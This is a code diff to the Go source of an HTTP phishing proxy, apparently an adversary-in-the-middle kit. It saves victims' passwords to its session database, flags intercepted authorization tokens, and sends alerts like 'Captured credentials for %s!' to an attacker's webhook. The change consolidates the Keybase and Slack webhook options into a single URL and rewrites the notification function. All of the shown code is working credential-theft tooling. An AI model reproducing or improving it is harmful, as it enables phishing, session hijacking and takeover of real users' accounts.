@@ -778,10 +778,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
-											if phishedUser != "" && (p.cfg.kbWebhookUrl != "" || p.cfg.slackWebhookUrl != "") {
+											if phishedUser != "" && p.cfg.webhookUrl != "" {
 												notify := fmt.Sprintf("Captured credentials for %s!", phishedUser)
 												p.WebhookNotify(notify)
-											} else if phishedUser == "" && (p.cfg.kbWebhookUrl != "" || p.cfg.slackWebhookUrl != "") {
+											} else if phishedUser == "" && p.cfg.webhookUrl != "" {
 												notify := "Credentials captured!"
 												p.WebhookNotify(notify)
 											}
@@ -1060,7 +1060,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-						if p.cfg.kbWebhookUrl != "" || p.cfg.slackWebhookUrl != "" {
+						if p.cfg.webhookUrl != "" {
 							notify := "Authorization tokens intercepted!"
 							p.WebhookNotify(notify)
 						}
@@ -2014,51 +2014,35 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 }
 
 func (p *HttpProxy) WebhookNotify(content string) {
-	type webhookConfig struct {
-		url        string
-		payloadKey string
-		name       string
+	if p.cfg.webhookUrl == "" {
+		return
 	}
 
-	webhooks := []webhookConfig{
-		{url: p.cfg.kbWebhookUrl, payloadKey: "msg", name: "Keybase"},
-		{url: p.cfg.slackWebhookUrl, payloadKey: "text", name: "Slack"},
+	payload := map[string]string{"msg": content}
+	jsonPayload, err := json.Marshal(payload)
+	if err != nil {
+		log.Error("Failed to marshal JSON payload: %v", err)
+		return
 	}
+
+	req, err := http.NewRequest("POST", p.cfg.webhookUrl, bytes.NewBuffer(jsonPayload))
+	if err != nil {
+		log.Error("Failed to create request: %v", err)
+		return
+	}
+	req.Header.Set("Content-Type", "application/json")
 
 	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Error("Failed to send webhook: %v", err)
+		return
+	}
+	defer resp.Body.Close()
 
-	for _, wh := range webhooks {
-		if wh.url == "" {
-			continue
-		}
-
-		payload := map[string]string{
-			wh.payloadKey: content,
-		}
-		jsonPayload, err := json.Marshal(payload)
-		if err != nil {
-			log.Error("Failed to marshal JSON payload for %s: %v", wh.name, err)
-			continue
-		}
-
-		req, err := http.NewRequest("POST", wh.url, bytes.NewBuffer(jsonPayload))
-		if err != nil {
-			log.Error("Failed to create request for %s: %v", wh.name, err)
-			continue
-		}
-		req.Header.Set("Content-Type", "application/json")
-
-		resp, err := client.Do(req)
-		if err != nil {
-			log.Error("Failed to send request to %s webhook: %v", wh.name, err)
-			continue
-		}
-		defer resp.Body.Close()
-
-		if resp.StatusCode == http.StatusOK {
-			log.Info("%s webhook notification sent", wh.name)
-		} else {
-			log.Error("Failed to send notification to %s webhook, status: %v", wh.name, resp.StatusCode)
-		}
+	if resp.StatusCode == http.StatusOK {
+		log.Info("Webhook notification sent")
+	} else {
+		log.Error("Failed to send webhook, status: %v", resp.StatusCode)
 	}
 }
